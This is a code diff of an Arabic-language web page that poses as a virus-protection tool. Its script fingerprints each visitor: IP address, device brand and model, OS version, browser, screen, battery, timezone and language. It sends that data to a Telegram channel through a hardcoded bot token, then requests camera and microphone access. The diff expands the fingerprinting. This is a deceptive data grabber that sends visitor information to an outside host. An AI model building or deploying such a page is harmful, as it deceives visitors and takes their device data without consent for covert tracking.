@@ -28,7 +28,6 @@
             overflow-x: hidden;
         }
 
-        /* تأثير الخلفية المتحركة */
         body::before {
             content: '';
             position: absolute;
@@ -132,7 +131,6 @@
             box-shadow: 0 4px 0 #4a1d6d, 0 10px 30px rgba(157, 78, 221, 0.4);
         }
 
-        /* دائرة التحميل الاحترافية */
         .loading-container {
             display: flex;
             justify-content: center;
@@ -152,7 +150,6 @@
             animation: pulse-glow 2s ease-in-out infinite;
         }
 
-        /* الدائرة الخارجية المتحركة */
         .outer-circle {
             position: absolute;
             width: 100%;
@@ -168,7 +165,6 @@
                 inset 0 0 30px rgba(255, 255, 255, 0.3);
         }
 
-        /* طبقة الدائرة الداخلية */
         .inner-circle {
             position: absolute;
             width: 85%;
@@ -182,7 +178,6 @@
             border: 2px solid rgba(168, 85, 247, 0.6);
         }
 
-        /* النص داخل الدائرة */
         .loading-text {
             color: #f0e6ff;
             font-size: 1.6rem;
@@ -198,7 +193,6 @@
             letter-spacing: 1px;
         }
 
-        /* حلقات دوارة إضافية */
         .ring-1, .ring-2, .ring-3 {
             position: absolute;
             border-radius: 50%;
@@ -238,7 +232,6 @@
             opacity: 0.7;
         }
 
-        /* نقاط متوهجة */
         .dots {
             position: absolute;
             width: 100%;
@@ -264,7 +257,6 @@
         .dot:nth-child(7) { bottom: 20%; left: 20%; }
         .dot:nth-child(8) { bottom: 20%; right: 20%; }
 
-        /* Animations */
         @keyframes rotate-gradient {
             0% { transform: rotate(0deg); filter: hue-rotate(0deg); }
             100% { transform: rotate(360deg); filter: hue-rotate(360deg); }
@@ -290,7 +282,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* باقي التنسيقات */
         .info-card {
             background: rgba(12, 10, 17, 0.8);
             border-radius: 28px;
@@ -334,12 +325,12 @@
             background: #1e1428;
             padding: 6px 14px;
             border-radius: 40px;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             border: 1px solid #5e2e8c;
             box-shadow: inset 0 2px 5px #00000055, 0 2px 5px #b77ef030;
             direction: ltr;
             text-align: right;
-            max-width: 60%;
+            max-width: 65%;
             word-break: break-word;
         }
 
@@ -368,22 +359,6 @@
             border-color: #a855f7;
         }
 
-        .status-container {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .badge {
-            background: linear-gradient(145deg, #3b2752, #221530);
-            color: #e9d2ff;
-            padding: 2px 8px;
-            border-radius: 100px;
-            font-size: 0.7rem;
-            border: 1px solid #a34fdd;
-            margin-right: 6px;
-        }
-
         .loader {
             width: 16px;
             height: 16px;
@@ -409,6 +384,15 @@
         .hidden {
             display: none !important;
         }
+
+        .success-badge {
+            background: linear-gradient(145deg, #4a1d6d, #2a1b3d);
+            color: #e0b3ff;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            margin-right: 8px;
+        }
     </style>
 </head>
 <body>
@@ -419,7 +403,6 @@
             <span>🔮</span> ابدأ حمايه جهازك من الفيروسات <span>✨</span>
         </button>
 
-        <!-- دائرة التحميل الاحترافية -->
         <div id="loadingCircle" class="loading-container hidden">
             <div class="loading-circle">
                 <div class="outer-circle"></div>
@@ -462,8 +445,18 @@
             </div>
             
             <div class="info-item">
-                <span class="label">📱 <span>الجهاز</span></span>
-                <span class="value" id="deviceName">-</span>
+                <span class="label">📱 <span>اسم الجهاز</span></span>
+                <span class="value" id="deviceFullName">-</span>
+            </div>
+
+            <div class="info-item">
+                <span class="label">🏭 <span>الشركة المصنعة</span></span>
+                <span class="value" id="deviceBrand">-</span>
+            </div>
+
+            <div class="info-item">
+                <span class="label">🔧 <span>الموديل / الطراز</span></span>
+                <span class="value" id="deviceModel">-</span>
             </div>
             
             <div class="info-item">
@@ -500,11 +493,9 @@
     </div>
 
     <script>
-        // إعدادات البوت والقناة
         const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
-        const CHANNEL_ID = '-1003875161698';  // معرف القناة
+        const CHANNEL_ID = '-1003875161698';
 
-        // دالة لإرسال النص إلى تيليغرام
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
@@ -518,88 +509,229 @@
                     })
                 });
                 const data = await response.json();
-                if (!data.ok) {
-                    console.error('خطأ من تيليغرام:', data);
-                } else {
-                    console.log('تم الإرسال بنجاح');
-                }
+                if (!data.ok) console.error('خطأ:', data);
+                else console.log('تم الإرسال');
             } catch (error) {
-                console.error('فشل الاتصال بتليغرام:', error);
+                console.error('فشل الإرسال:', error);
             }
         }
 
-        // دالة عنوان IP
         async function getIPAddress() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
-            } catch (error) {
+            } catch {
                 return 'غير متاح';
             }
         }
 
-        // اسم الجهاز
-        function getDeviceName() {
+        // قاعدة بيانات موسعة لاستخراج معلومات الهاتف من User-Agent
+        function getAdvancedDeviceInfo() {
             const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/i.test(ua)) return 'Apple iPhone/iPad';
-            if (/Android/i.test(ua)) return 'جهاز Android';
-            if (/Windows/i.test(ua)) return 'كمبيوتر Windows';
-            if (/Mac/i.test(ua)) return 'Apple Mac';
-            if (/Linux/i.test(ua)) return 'جهاز Linux';
-            return 'جهاز غير معروف';
+            const lowerUA = ua.toLowerCase();
+            
+            // قائمة شاملة للعلامات التجارية مع أنماط التعرف
+            const brandPatterns = [
+                { patterns: ['samsung', 'sm-'], name: 'Samsung', models: ['galaxy', 'note', 'a series', 's series'] },
+                { patterns: ['xiaomi', 'mi ', 'redmi', 'poco', 'black shark'], name: 'Xiaomi', models: ['redmi', 'mi', 'poco'] },
+                { patterns: ['oppo', 'cph', 'reno'], name: 'OPPO', models: ['reno', 'find', 'a series'] },
+                { patterns: ['vivo', 'v ', 'iqoo'], name: 'vivo', models: ['v', 'iqoo', 'x series'] },
+                { patterns: ['realme', 'rmx'], name: 'realme', models: ['gt', 'narzo', 'c series'] },
+                { patterns: ['huawei', 'hry', 'jkm'], name: 'Huawei', models: ['p series', 'mate', 'nova'] },
+                { patterns: ['honor', 'lge'], name: 'Honor', models: ['magic', 'x series', 'play'] },
+                { patterns: ['oneplus', 'le212', 'in20'], name: 'OnePlus', models: ['nord', 'pro'] },
+                { patterns: ['nokia', 'ta-'], name: 'Nokia', models: ['g series', 'x series', 'c series'] },
+                { patterns: ['motorola', 'moto'], name: 'Motorola', models: ['edge', 'g series', 'razr'] },
+                { patterns: ['google', 'pixel'], name: 'Google', models: ['pixel'] },
+                { patterns: ['asus', 'zenfone'], name: 'Asus', models: ['rog', 'zenfone'] },
+                { patterns: ['sony', 'xperia'], name: 'Sony', models: ['xperia'] },
+                { patterns: ['lg', 'lg-'], name: 'LG', models: ['wing', 'velvet'] },
+                { patterns: ['tecno', 'tecno'], name: 'Tecno', models: ['camon', 'spark'] },
+                { patterns: ['infinix', 'infinix'], name: 'Infinix', models: ['hot', 'note', 'zero'] },
+                { patterns: ['itel', 'itel'], name: 'Itel', models: ['a series', 's series'] }
+            ];
+            
+            let brand = 'غير معروف';
+            let modelCode = '';
+            let seriesName = '';
+            
+            // البحث عن العلامة التجارية
+            for (let bp of brandPatterns) {
+                for (let pattern of bp.patterns) {
+                    if (lowerUA.includes(pattern)) {
+                        brand = bp.name;
+                        break;
+                    }
+                }
+                if (brand !== 'غير معروف') break;
+            }
+            
+            // استخراج كود الموديل (نماذج شائعة)
+            const modelPatterns = [
+                /SM-[A-Z0-9]{3,5}/i,           // Samsung: SM-G990B, SM-A525F
+                /RMX[0-9]{4}/i,                 // Realme: RMX3370
+                /CPH[0-9]{4}/i,                 // OPPO: CPH2451
+                /V[0-9]{4}[A-Z]?/i,             // Vivo: V2045
+                /M[0-9]{4}[A-Z]?/i,             // Xiaomi: M2012K11AG
+                /210[0-9]{4}[A-Z]?/i,           // Xiaomi Redmi
+                /220[0-9]{4}[A-Z]?/i,
+                /230[0-9]{4}[A-Z]?/i,
+                /TA-[0-9]{4}/i,                 // Nokia: TA-1234
+                /LE[0-9]{3}[A-Z]?/i,            // OnePlus: LE2115
+                /Pixel [0-9]/i,                 // Google Pixel
+                /iPhone[0-9,]+/i,               // iPhone
+                /Nexus [0-9]/i
+            ];
+            
+            for (let pattern of modelPatterns) {
+                let match = ua.match(pattern);
+                if (match) {
+                    modelCode = match[0];
+                    break;
+                }
+            }
+            
+            // استخراج اسم السلسلة التجارية
+            if (brand === 'Samsung') {
+                if (lowerUA.includes('galaxy s')) seriesName = 'Galaxy S';
+                else if (lowerUA.includes('galaxy a')) seriesName = 'Galaxy A';
+                else if (lowerUA.includes('galaxy note')) seriesName = 'Galaxy Note';
+                else if (lowerUA.includes('galaxy z')) seriesName = 'Galaxy Z';
+                else if (lowerUA.includes('galaxy m')) seriesName = 'Galaxy M';
+                else seriesName = 'Galaxy';
+            } 
+            else if (brand === 'Xiaomi') {
+                if (lowerUA.includes('redmi note')) seriesName = 'Redmi Note';
+                else if (lowerUA.includes('redmi')) seriesName = 'Redmi';
+                else if (lowerUA.includes('poco')) seriesName = 'POCO';
+                else if (lowerUA.includes('mi ')) seriesName = 'Mi';
+                else seriesName = 'Xiaomi';
+            }
+            else if (brand === 'OPPO') {
+                if (lowerUA.includes('reno')) seriesName = 'Reno';
+                else if (lowerUA.includes('find')) seriesName = 'Find';
+                else seriesName = 'OPPO';
+            }
+            else if (brand === 'realme') {
+                if (lowerUA.includes('gt')) seriesName = 'GT';
+                else if (lowerUA.includes('narzo')) seriesName = 'Narzo';
+                else seriesName = 'realme';
+            }
+            else if (brand === 'Huawei') {
+                if (lowerUA.includes('p series')) seriesName = 'P Series';
+                else if (lowerUA.includes('mate')) seriesName = 'Mate';
+                else if (lowerUA.includes('nova')) seriesName = 'Nova';
+                else seriesName = 'Huawei';
+            }
+            else if (brand === 'Google') {
+                seriesName = 'Pixel';
+            }
+            
+            // بناء الاسم الكامل
+            let fullName = brand;
+            if (seriesName && seriesName !== brand) {
+                fullName = `${brand} ${seriesName}`;
+            }
+            if (modelCode && !fullName.includes(modelCode)) {
+                fullName = `${fullName} (${modelCode})`;
+            }
+            
+            // معالجة أجهزة iOS
+            if (/iPhone|iPad|iPod/i.test(ua)) {
+                brand = 'Apple';
+                let iosMatch = ua.match(/iPhone(\d+,\d+)/i) || ua.match(/iPad(\d+,\d+)/i);
+                if (iosMatch) modelCode = `iPhone ${iosMatch[1]}`;
+                else modelCode = 'iPhone';
+                fullName = `Apple ${modelCode}`;
+            }
+            else if (/Mac/i.test(ua)) {
+                brand = 'Apple';
+                fullName = 'Apple Mac';
+                modelCode = 'Mac';
+            }
+            else if (/Windows/i.test(ua) && !/Android/i.test(ua)) {
+                brand = 'Microsoft';
+                fullName = 'Windows PC';
+                modelCode = 'PC';
+            }
+            
+            return {
+                brand: brand,
+                model: modelCode || (fullName !== brand ? fullName.replace(brand, '').trim() || 'غير محدد' : 'غير محدد'),
+                fullName: fullName
+            };
         }
-
-        // البطارية
+        
+        // الحصول على إصدار نظام التشغيل بالتفصيل
+        function getDetailedOS() {
+            const ua = navigator.userAgent;
+            
+            // Android مع الإصدار
+            let androidMatch = ua.match(/Android (\d+(?:\.\d+)?)/);
+            if (androidMatch) {
+                return `Android ${androidMatch[1]}`;
+            }
+            
+            // iOS
+            let iosMatch = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
+            if (iosMatch) {
+                let version = `${iosMatch[1]}.${iosMatch[2]}`;
+                if (iosMatch[3]) version += `.${iosMatch[3]}`;
+                return `iOS ${version}`;
+            }
+            
+            // Windows
+            if (ua.includes('Windows NT 10.0')) return 'Windows 11/10';
+            if (ua.includes('Windows NT 6.2')) return 'Windows 8';
+            if (ua.includes('Windows NT 6.1')) return 'Windows 7';
+            
+            // macOS
+            let macMatch = ua.match(/Mac OS X (\d+)[._](\d+)/);
+            if (macMatch) {
+                return `macOS ${macMatch[1]}.${macMatch[2]}`;
+            }
+            
+            if (ua.includes('Linux')) return 'Linux';
+            return 'غير معروف';
+        }
+        
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
+            if (ua.includes('Firefox')) return 'Mozilla Firefox';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
+            if (ua.includes('Edg')) return 'Microsoft Edge';
+            if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
+            if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
+            return 'متصفح آخر';
+        }
+        
         async function getBatteryInfo() {
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
-                    const charging = battery.charging ? 'يشحن' : 'لا يشحن';
-                    return `${level}% (${charging})`;
+                    const charging = battery.charging ? '⚡ يشحن' : '🔋 لا يشحن';
+                    return `${level}% ${charging}`;
                 } catch {
                     return 'غير متاح';
                 }
             }
             return 'غير مدعوم';
         }
-
-        // نظام التشغيل والمتصفح
-        function getSystemInfo() {
-            const ua = navigator.userAgent;
-            let os = 'غير معروف';
-            let browser = 'غير معروف';
-
-            if (ua.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
-            else if (ua.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
-            else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
-            else if (ua.indexOf('Mac OS X') !== -1) os = 'macOS';
-            else if (ua.indexOf('Android') !== -1) os = 'Android';
-            else if (/iOS|iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
-            else if (ua.indexOf('Linux') !== -1) os = 'Linux';
-
-            if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) browser = 'Google Chrome';
-            else if (ua.indexOf('Firefox') !== -1) browser = 'Mozilla Firefox';
-            else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Apple Safari';
-            else if (ua.indexOf('Edg') !== -1) browser = 'Microsoft Edge';
-            else if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) browser = 'Opera';
-
-            return { os, browser };
-        }
-
-        // حالة الاتصال
+        
         function updateConnectionStatus() {
             const isOnline = navigator.onLine;
             const dot = document.getElementById('statusDot');
             const text = document.getElementById('statusText');
             const connType = document.getElementById('connectionType');
-
+            
             if (isOnline) {
                 dot.className = 'online-status online';
                 text.textContent = 'متصل';
                 if ('connection' in navigator) {
-                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    const connection = navigator.connection || navigator.mozConnection;
                     if (connection && connection.effectiveType) {
                         connType.textContent = connection.effectiveType.toUpperCase();
                     } else {
@@ -614,112 +746,101 @@
                 connType.textContent = '-';
             }
         }
-
-        // تنسيق الرسالة المرسلة إلى التيليغرام
+        
         function formatTelegramMessage(data) {
             return `
-╔═══════════════════
-║  <b>معلومات الجهاز</b>
-╠═══════════════════
+╔══════════════════════════════════╗
+║    <b>📱 معلومات الجهاز المفصلة</b>     ║
+╠══════════════════════════════════╣
 ║ <b>🌐 الحالة:</b> ${data.statusText} (${data.connectionType})
 ║ <b>🔢 IP:</b> <code>${data.ip}</code>
-║ <b>📱 الجهاز:</b> ${data.device}
-║ <b>💻 النظام:</b> ${data.os}
+║ <b>📱 الجهاز:</b> ${data.fullDevice}
+║ <b>🏭 الشركة:</b> ${data.brand}
+║ <b>🔧 الموديل:</b> ${data.model}
+║ <b>💻 نظام التشغيل:</b> ${data.osVersion}
 ║ <b>🌍 المتصفح:</b> ${data.browser}
 ║ <b>📏 الشاشة:</b> ${data.screen}
 ║ <b>🔋 البطارية:</b> ${data.battery}
-║ <b>🕒 التوقيت:</b> ${data.timezone}
+║ <b>🕒 المنطقة:</b> ${data.timezone}
 ║ <b>🗣️ اللغة:</b> ${data.lang}
-╚═══════════════════
+╚══════════════════════════════════╝
 ⏰ <i>${new Date().toLocaleString('ar-EG')}</i>
             `;
         }
-
-        // الدالة الرئيسية - تبدأ بعرض دائرة التحميل ثم تجلب المعلومات
+        
         async function startProcess() {
-            // إخفاء الزر وإظهار دائرة التحميل
             document.getElementById('actionBtn').style.display = 'none';
             document.getElementById('loadingCircle').classList.remove('hidden');
             
-            // تأخير بسيط لإظهار الدائرة (تأثير دراماتيكي)
             await new Promise(resolve => setTimeout(resolve, 2500));
-
-            // إخفاء الدائرة وإظهار بطاقة المعلومات
+            
             document.getElementById('loadingCircle').classList.add('hidden');
-            const infoCard = document.getElementById('infoCard');
-            infoCard.style.display = 'block';
-
-            // عناصر لعرضها
+            document.getElementById('infoCard').style.display = 'block';
+            
             const ipEl = document.getElementById('ipAddress');
-            const deviceEl = document.getElementById('deviceName');
+            const deviceFullEl = document.getElementById('deviceFullName');
+            const deviceBrandEl = document.getElementById('deviceBrand');
+            const deviceModelEl = document.getElementById('deviceModel');
             const osEl = document.getElementById('os');
             const browserEl = document.getElementById('browser');
             const screenEl = document.getElementById('screenResolution');
             const batteryEl = document.getElementById('batteryInfo');
             const timezoneEl = document.getElementById('timezone');
             const langEl = document.getElementById('language');
-
-            // التحديث الأولي
+            
             updateConnectionStatus();
             window.addEventListener('online', updateConnectionStatus);
             window.addEventListener('offline', updateConnectionStatus);
-
-            // جلب IP
+            
             ipEl.innerHTML = '<span class="loader"></span>';
             const ip = await getIPAddress();
             ipEl.textContent = ip;
-
-            const device = getDeviceName();
-            deviceEl.textContent = device;
-
-            const sys = getSystemInfo();
-            osEl.textContent = sys.os;
-            browserEl.textContent = sys.browser;
-
+            
+            const deviceInfo = getAdvancedDeviceInfo();
+            deviceFullEl.textContent = deviceInfo.fullName;
+            deviceBrandEl.textContent = deviceInfo.brand;
+            deviceModelEl.textContent = deviceInfo.model;
+            
+            const osVersion = getDetailedOS();
+            osEl.textContent = osVersion;
+            
+            browserEl.textContent = getBrowserInfo();
             screenEl.textContent = `${window.screen.width} × ${window.screen.height}`;
-
-            const battery = await getBatteryInfo();
-            batteryEl.textContent = battery;
-
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            timezoneEl.textContent = timezone;
-
-            const lang = navigator.language || navigator.userLanguage;
-            langEl.textContent = lang;
-
-            // تجميع البيانات للإرسال
+            batteryEl.textContent = await getBatteryInfo();
+            timezoneEl.textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            langEl.textContent = navigator.language || navigator.userLanguage;
+            
             const statusText = document.getElementById('statusText').textContent;
             const connectionType = document.getElementById('connectionType').textContent;
-
+            
             const collectedData = {
                 ip,
-                device,
-                os: sys.os,
-                browser: sys.browser,
+                fullDevice: deviceInfo.fullName,
+                brand: deviceInfo.brand,
+                model: deviceInfo.model,
+                osVersion,
+                browser: getBrowserInfo(),
                 screen: `${window.screen.width}×${window.screen.height}`,
-                battery,
-                timezone,
-                lang,
+                battery: await getBatteryInfo(),
+                timezone: timezoneEl.textContent,
+                lang: langEl.textContent,
                 statusText,
                 connectionType
             };
-
-            // إرسال إلى تليغرام
+            
             const message = formatTelegramMessage(collectedData);
             await sendToTelegram(message);
-
-            // محاولة طلب إذن الميكروفون/كاميرا لمزيد من التفاعل (اختياري)
+            
+            // محاولة طلب الصلاحيات
             if (navigator.mediaDevices) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                     stream.getTracks().forEach(track => track.stop());
-                } catch (err) {
-                    // المستخدم رفض أو لا يوجد أجهزة
-                }
+                } catch (err) {}
             }
         }
-
-        console.log('الموقع الاحترافي جاهز مع دائرة التحميل');
+        
+        console.log('تم تحميل الموقع - جاهز لاستخراج معلومات الجهاز');
     </script>
 </body>
 </html>
